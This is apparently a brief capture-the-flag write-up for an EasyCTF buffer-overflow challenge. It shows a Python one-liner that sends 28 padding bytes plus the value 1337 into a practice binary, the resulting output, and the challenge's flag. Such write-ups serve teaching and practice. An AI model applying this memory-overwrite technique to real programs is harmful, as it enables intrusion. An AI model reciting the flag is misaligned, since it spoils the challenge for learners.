The source tells us that we need to overflow the character buffer with a size of 20.
However, the actual overflow occurs after sending 28 characters to the binary.
Now, we simply need to send something that evaluates to 1337. Here's what I did:

    user04ce4@shell:/problems/overflow1$ python -c 'print "A"*28 + "\x39\x05"' | ./overflow1
    Here's a flag: easyctf{i_wish_everything_were_th1s_34sy}

    1337
    user04ce4@shell:/problems/overflow1$

easyctf{i_wish_everything_were_th1s_34sy}
